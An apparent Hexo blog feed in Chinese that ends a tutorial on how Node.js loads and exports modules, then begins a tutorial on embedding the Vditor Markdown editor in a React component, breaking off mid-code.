keyword">function</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/**   *⽂件头部   *Module.wrapper = NativeModule.wrapper;   *Module.wrap = NativeModule.wrap;    */</span>  <span class="token keyword">var</span> wrapper <span class="token operator">=</span> Module<span class="token punctuation">.</span><span class="token function">wrap</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// vm.runInThisContext在⼀个v8的虚拟机内部执⾏wrapper后的代码,类似于eval</span>  <span class="token keyword">var</span> compiledWrapper <span class="token operator">=</span> <span class="token function">runInThisContext</span><span class="token punctuation">(</span>wrapper<span class="token punctuation">,</span> <span class="token punctuation">{</span>    filename<span class="token punctuation">:</span> filename<span class="token punctuation">,</span>    lineOffset<span class="token punctuation">:</span> <span class="token number">0</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//...</span>  <span class="token keyword">const</span> dirname <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">dirname</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/**   *这个require并⾮是Module.prototype.require⽅法，   *⽽是通过internalModule.makeRequireFunction重新构造出来的，   *这个⽅法内部还是依赖Module.prototype.require⽅法去加载模块的，   *同时还对这个require⽅法做了⼀些拓展。   */</span>  <span class="token keyword">const</span> require <span class="token operator">=</span> internalModule<span class="token punctuation">.</span>makeRequireFunction<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>exports<span class="token punctuation">,</span> require<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">,</span> filename<span class="token punctuation">,</span> dirname<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> result <span class="token operator">=</span> compiledWrapper<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>exports<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">makeRequireFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> Module <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>constructor<span class="token punctuation">;</span>  <span class="token keyword">const</span> self <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">require</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>      exports<span class="token punctuation">.</span>requireDepth <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> self<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>      exports<span class="token punctuation">.</span>requireDepth <span class="token operator">-</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">resolve</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> Module<span class="token punctuation">.</span><span class="token function">_resolveFilename</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  require<span class="token punctuation">.</span>resolve <span class="token operator">=</span> resolve<span class="token punctuation">;</span>  require<span class="token punctuation">.</span>main <span class="token operator">=</span> process<span class="token punctuation">.</span>mainModule<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// Enable support to add extra extension types.</span>  require<span class="token punctuation">.</span>extensions <span class="token operator">=</span> Module<span class="token punctuation">.</span>_extensions<span class="token punctuation">;</span>require<span class="token punctuation">.</span>cache <span class="token operator">=</span> Module<span class="token punctuation">.</span>_cache<span class="token punctuation">;</span>  <span class="token keyword">return</span> require<span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>require(): 加载外部模块</li><li>require.resolve()：将模块名解析到⼀个绝对路径</li><li>require.main：指向主模块</li><li>require.cache：指向所有缓存的模块</li><li>require.extensions：根据⽂件的后缀名，调⽤不同的执⾏函数</li></ul><h4 id="9、扩展"><a href="#9、扩展" class="headerlink" title="9、扩展"></a><strong>9</strong>、扩展</h4><p>以node index.js的形式启动，模块如何加载？  </p><p>其实node启动的原理跟require是⼀样的，src/node.cc中的node::LoadEnvironment函数会被调⽤，</p><p>在该函数内则会接着调⽤lib/internal/bootstrap_node.js中的代码，并执⾏startup函数，startup函</p><p>数会执⾏Module.runMain⽅法，⽽Module.runMain⽅法会执⾏Module._load⽅法，参数就是命令</p><p>⾏的第⼀个参数（⽐如： node index.js），如此，跟前⾯介绍的require就⾛到⼀起了。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// bootstrap main module.</span>Module<span class="token punctuation">.</span>runMain <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Load the main module--the command line argument.</span>  Module<span class="token punctuation">.</span><span class="token function">_load</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// Handle any nextTicks added in the first tick of the program</span>  process<span class="token punctuation">.</span><span class="token function">_tickCallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="10、流程图"><a href="#10、流程图" class="headerlink" title="10、流程图"></a><strong>10</strong>、流程图</h4><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm05flmob1j30gc0kegnk.jpg" alt="image-20201225154755972">  </p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm05ghtiytj30hj0oegoz.jpg" alt="image-20201225154847678">  </p><h2 id="Node模块导出"><a href="#Node模块导出" class="headerlink" title="Node模块导出"></a>Node模块导出</h2><ul><li>Node.js中是模块作用域 ，默认文件中的所有成员只在当前文件中有效（关闭原则）</li><li>对于希望可以访问的模块成员，需将其挂载到module.exports 或 exports</li></ul><p>在 NodeJS 中想要导出模块中的变量或者函数有三种方式</p><ul><li>通过exports.xxx = xxx 导出  </li></ul><p>a.js</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> name <span class="token operator">=</span> <span class="token string">"it6666.top"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">sum</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token punctuation">}</span>exports<span class="token punctuation">.</span>str <span class="token operator">=</span> name<span class="token punctuation">;</span>exports<span class="token punctuation">.</span>fn <span class="token operator">=</span> sum<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>b.js</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> aModule <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./07-a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>aModule<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>aModule<span class="token punctuation">.</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>aModule<span class="token punctuation">.</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果如下所示：  </p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm06p0h3nqj30ss03fgll.jpg" alt="img"></p><ul><li>通过 module.exports.xxx = xxx 导出</li></ul><p>a.js</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> name <span class="token operator">=</span> <span class="token string">"it6666.top"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">sum</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token punctuation">}</span>module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>str <span class="token operator">=</span> name<span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>fn <span class="token operator">=</span> sum<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>b.js 其实可以不动的，我把返回值单独的接收了一下然后在输出打印。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> aModule <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./07-a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>aModule<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>aModule<span class="token punctuation">.</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> res <span class="token operator">=</span> aModule<span class="token punctuation">.</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果如下所示：</p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm06qbvicgj30tq03dgll.jpg" alt="img"></p><ul><li>通过 global.xxx = xxx 导出</li></ul><p>a.js</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> name <span class="token operator">=</span> <span class="token string">"it6666.top"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">sum</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token punctuation">}</span>global<span class="token punctuation">.</span>str <span class="token operator">=</span> name<span class="token punctuation">;</span>global<span class="token punctuation">.</span>fn <span class="token operator">=</span> sum<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>b.js</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> aModule <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./07-a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果如下所示：</p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm06w5c2jwj30un033dfr.jpg" alt="img"></p><p>参考⽂献：</p><p><a href="https://juejin.im/post/5ab4d3d151882521d6578298" target="_blank" rel="noopener">https://juejin.im/post/5ab4d3d151882521d6578298</a></p><p><a href="https://segmentfault.com/a/1190000012086435" target="_blank" rel="noopener">https://segmentfault.com/a/1190000012086435</a></p><p><a href="https://www.jianshu.com/p/ed3435661583" target="_blank" rel="noopener">https://www.jianshu.com/p/ed3435661583</a></p><p><a href="https://my.oschina.net/luyongfugx/blog/395455?utm_source=tuicoolhttps://segmentfault.com/a/1190000012373889" target="_blank" rel="noopener">https://my.oschina.net/luyongfugx/blog/395455?utm_source=tuicoolhttps://segmentfault.com/a/1190000012373889</a></p><p><a href="https://blog.csdn.net/w_q_1025/article/details/54896346" target="_blank" rel="noopener">https://blog.csdn.net/w_q_1025/article/details/54896346</a></p><p><a href="https://www.jianshu.com/p/609489e8c929" target="_blank" rel="noopener">https://www.jianshu.com/p/609489e8c929</a></p><p><a href="https://www.jianshu.com/p/99d78efeae25" target="_blank" rel="noopener">https://www.jianshu.com/p/99d78efeae25</a></p><p>源码：</p><p><a href="https://github.com/nodejs/node/blob/v5.x/lib/module.js" target="_blank" rel="noopener">https://github.com/nodejs/node/blob/v5.x/lib/module.js</a></p><p><a href="https://github.com/nodejs/node/blob/v5.x/lib/internal/module.js" target="_blank" rel="noopener">https://github.com/nodejs/node/blob/v5.x/lib/internal/module.js</a></p><p><a href="https://github.com/nodejs/node/blob/v5.x/lib/internal/bootstrap_node.js" target="_blank" rel="noopener">https://github.com/nodejs/node/blob/v5.x/lib/internal/bootstrap_node.js</a></p>]]></content>
      
      
      <categories>
          
          <category> nodejs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React中使用Vditor详解</title>
      <link href="2020/12/24/React%E4%B8%AD%E4%BD%BF%E7%94%A8Vditor%E8%AF%A6%E8%A7%A3/"/>
      <url>2020/12/24/React%E4%B8%AD%E4%BD%BF%E7%94%A8Vditor%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><blockquote><p>npm install vditor -s</p></blockquote><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>导入依赖包</p><blockquote><p>import Vditor from “vditor”;</p></blockquote><p>导入样式</p><blockquote><p>import “vditor/src/assets/scss/index.scss”;</p></blockquote><h2 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">class</span> <span class="token class-name">Vditor</span> <span class="token keyword">extends</span> <span class="token class-name">Component</span> <span class="token punctuation">{</span>  <span class="token function">constructor</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">super</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>        editValue<span class="token punctuation">:</span> <span class="token string">""</span>      <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  componentDidMount <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//组件挂载完成之后调用 注意一定要在组件挂载完成之后调用 否则会找不到注入的DOM</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">createVidtor</span><span class="token punctuation">(</span><span class="token punctuation">{</span> value<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>editValue <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//创建编辑器 下面会详解</span>  createVidtor <span class="token operator">=</span> params <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">let</span> <span class="token punctuation">{</span> value <span class="token punctuation">}</span> <span class="token operator">=</span> params<span class="token punctuation">;</span>      value <span class="token operator">=</span> value <span class="token operator">?</span> value <span class="token punctuation">:</span> <span class="token string">" "</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> that <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>      <span class="token keyword">const</span> vditor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vditor</span><span class="token punctuation">(</span><span class="token string">"vditor"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>          height<span class="token punctuation">:</span> <span class="token number">800</span><span class="token punctuation">,</span>          mode<span class="token punctuation">:</span> <span class="token string">"ir"</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//及时渲染模式</span>          placeholder<span class="token punctuation">:</span> <span class="token string">"React Vditor"</span><span class="token punctuation">,</span>          toolbar<span class="token punctuation">:</span> <span class="token punctuation">[</span>              <span class="token string">"emoji"</span><span class="token punctuation">,</span>              <span class="token string">"headings"</span><span class="token punctuation">,</span>              <span class="token string">"bold"</span><span class="token punctuation">,</span>              <span class="token string">"italic"</span><span class="token punctuation">,</span>              <span class="token string">"strike"</span><span class="token punctuation">,</span>              <span class="token string">"link"</span><span class="token punctuation">,</span>              <span class="token string">"|"</span><span class="token punctuation">,</span>              <span class="token string">"list"</span><span class="token punctuation">,</span>              <span class="token string">"ordered-list"</span><span class="token punctuation">,</span>              <span class="token string">"check"</span><span class="token punctuation">,</span>              <span class="token string">"outdent"</span><span class="token punctuation">,</span>              <span class="token string">"indent"</span><span class="token punctuation">,</span>              <span class="token string">"|"</span><span class="token punctuation">,</span>              <span class="token string">"quote"</span><span class="token punctuation">,</span>              <span class="token string">"line"</span><span class="token punctuation">,</span>              <span class="token string">"code"</span><span class="token punctuation">,</span>              <span class="token string">"inline-code"</span><span class="token punctuation">,</span>              <span class="token string">"insert-before"</span><span class="token punctuation">,</span>              <span class="token string">"insert-after"</span><span class="token punctuation">,</span>              <span class="token string">"|"</span><span class="token punctuation">,</span>              <span class="token string">"upload"</span><span class="token punctuation">,</span>              <span class="token string">"table"</span><span class="token punctuation">,</span>              <span class="token string">"|"</span><span class="token punctuation">,</span>              <span class="token string">"undo"</span><span class="token punctuation">,</span>              <span class="token string">"redo"</span><span class="token punctuation">,</span>              <span class="token string">"|"</span><span class="token punctuation">,</span>              <span class="token string">"fullscreen"</span><span class="token punctuation">,</span>              <span class="token string">"edit-mode"</span><span class="token punctuation">,</span>              <span class="token punctuation">{</span>                  name<span class="token punctuation">:</span> <span class="token string">"more"</span><span class="token punctuation">,</span>                  toolbar<span class="token punctuation">:</span> <span class="token punctuation">[</span>                      <span class="token string">"both"</span><span class="token punctuation">,</span>                      <span class="token string">"code-theme"</span><span class="token punctuation">,</span>                      <span class="token string">"content-theme"</span><span class="token punctuation">,</span>                      <span class="token string">"export"</span><span class="token punctuation">,</span>                      <span class="token string">"outline"</span><span class="token punctuation">,</span>                      <span class="token string">"preview"</span><span class="token punctuation">,</span>                      <span class="token string">"devtools"</span><span class="token punctuation">,</span>                      <span class="token string">"info"</span><span class="token punctuation">,</span>                      <span class="token string">"help"</span>                  <span class="token punctuation">]</span>              <span class="token punctuation">}</span><span class="token punctuation">,</span>              <span class="token string">"|"</span><span class="token punctuation">,</span>              <span class="token punctuation">{</span>                  hotkey<span class="token punctuation">:</span> <span class="token string">"⌘-S"</span><span class="token punctuation">,</span>                  name<span class="token punctuation">:</span> <span class="token string">"save"</span><span class="token punctuation">,</span>                  tipPosition<span class="token punctuation">:</span> <span class="token string">"s"</span><span class="token punctuation">,</span>                  tip<span class="token punctuation">:</span> <span class="token string">"保存"</span><span class="token punctuation">,</span>                  className<span class="token punctuation">:</span> <span class="token string">"right"</span><span class="token punctuation">,</span>                  icon<span class="token punctuation">:</span> <span class="token template-string"><span class="token string">`&lt;img style="height: 16px" src='https://img.58cdn.com.cn/escstatic/docs/imgUpload/idocs/save.svg'/>`</span></span><span class="token punctuation">,</span>                  <span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                      that<span class="token punctuation">.</span><span class="token function">saveDoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span>              <span class="token punctuation">}</span><span class="token punctuation">,</span>              <span class="token punctuation">{</span>                  hotkey<span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>                  name<span class="token punctuation">:</span> <span class="token string">"publish"</span><span class="token punctuation">,</span>                  tipPosition<span class="token punctuation">:</span> <span class="token string">"s"</span><span class="token punctuation">,</span>                  tip<span class="token punctuation">:</span> <span class="token string">"发布文章"</span><span class="token punctuation">,</span>                  className<span class="token punctuation">:</span> <span class="token string">"right"</span><span class="token punctuation">,</span>                  icon<span class="token punctuation">:</span> <span class="token template-string"><span class="token string">`&lt;img style="height: 16px" src='https://img.58cdn.com.cn/escstatic/docs/imgUpload/idocs/publish.svg'/>`</span></span><span class="token punctuation">,</span>                  <span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                      that<span class="token punctuation">.</span><span class="token function">publishDoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span>              <span class="token punctuation">}</span>          <span class="token punctuation">]</span><span class="token punctuation">,</span>          <span class="token function">after</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              vditor<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span><span class="token punctuation">,</span>          <span class="token function">blur</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              that<span class="token punctuation">.</span><span class="token function">saveDoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span><span class="token punctuation">,</span>          upload<span class="token punctuation">:</span> <span class="token punctuation">{</span>              accept<span class="token punctuation">:</span> <span class="token string">"image/*"</span><span class="token punctuation">,</span>              multiple<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>              <span class="token function">filename</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>                  <span class="token keyword">return</span> name                      <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[^(a-zA-Z0-9\u4e00-\u9fa5\.)]/g</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>                      <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[\?\\/:|&lt;>\*\[\]\(\)\$%\{\}@~]/g</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>                      <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"/\\s/g"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span><span class="token punctuation">,</span>              <span class="token function">handler</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span> <span class="token punctuation">{</span>                  <span class="token keyword">function</span> <span class="token function">callback</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token punctuation">{</span>                      <span class="token keyword">let</span> name <span class="token operator">=</span> files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>                      <span class="token keyword">let</span> succFileText <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                      <span class="token keyword">if</span> <span class="token punctuation">(</span>vditor <span class="token operator">&amp;&amp;</span> vditor<span class="token punctuation">.</span>vditor<span class="token punctuation">.</span>currentMode <span class="token operator">===</span> <span class="token string">"wysiwyg"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                          succFileText <span class="token operator">+</span><span class="token operator">=</span> <span class="token template-string"><span class="token string">`\n &lt;img alt=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> src="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>path<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">">`</span></span><span class="token punctuation">;</span>                      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                          succFileText <span class="token operator">+</span><span class="token operator">=</span> <span class="token template-string"><span class="token string">`  \n![</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">](</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>path<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">)`</span></span><span class="token punctuation">;</span>                      <span class="token punctuation">}</span>                      document<span class="token punctuation">.</span><span class="token function">execCommand</span><span class="token punctuation">(</span><span class="token string">"insertHTML"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> succFileText<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span>                  that<span class="token punctuation">.</span><span class="token function">handleImageUpload</span><span class="token punctuation">(</span>files<span class="token punctuation">,</span> callback<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span><span class="token punctuation">,</span>              <span class="token function">url</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span> <span class="token punctuation">{</span>                  that<span class="token punctuation">.</span><span class="token function">handleImageUpload</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span>          <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>vditor <span class="token operator">=</span> vditor<span class="token punctuation">;</span>      <span class="token keyword">return</span> vditor<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//首先需要在render里面注入DOM，可自定义注入DOM的ID，初始化编辑器的时候使用自定义的ID即可</span>  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token string">"editorWrap"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"vditor"</span> <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>示例：  </p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glz3k8xcesj30ql0fw40h.jpg" alt="image-20201224175738268">  </p><h2 id="功能使用"><a href="#功能使用" class="headerlink" title="功能使用"></a>功能使用</h2><h3 id="新建对象"><a href="#新建对象" class="headerlink" title="新建对象"></a>新建对象</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token 